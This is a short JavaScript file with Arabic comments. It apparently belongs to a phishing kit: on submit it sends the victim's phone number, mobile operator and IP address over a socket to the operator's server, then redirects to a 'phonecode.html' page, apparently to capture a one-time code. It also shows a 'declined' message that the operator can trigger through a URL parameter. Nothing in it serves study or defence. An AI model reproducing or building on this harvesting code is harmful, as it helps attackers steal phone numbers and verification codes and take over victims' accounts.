    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("phoneForm");
      const overlay = document.getElementById("loadingOverlay");
      const declineMsg = document.getElementById("decline-message");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");

        while (window.visitorIP === null) {
          await new Promise((r) => setTimeout(r, 50));
        }

        const phoneNum = document.getElementById("phone_input").value;
        const operator = document.getElementById("Selectـnetworkـoperator").value;

        window.socket.emit("submitPhone", {
          ip: window.visitorIP,
          phoneNumber: phoneNum,
          operator,
        });

        // إظهار التحميل ثم الانتقال التلقائي بعد 2 ثانية
        setTimeout(() => {
          window.location.href = "phonecode.html";
        }, 2000);
      });

      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        declineMsg.style.display = "block";
      }
      
      // إزالة معالج ackPhone القديم لأنه سينتقل تلقائياً الآن
      window.socket.off("ackPhone");
    });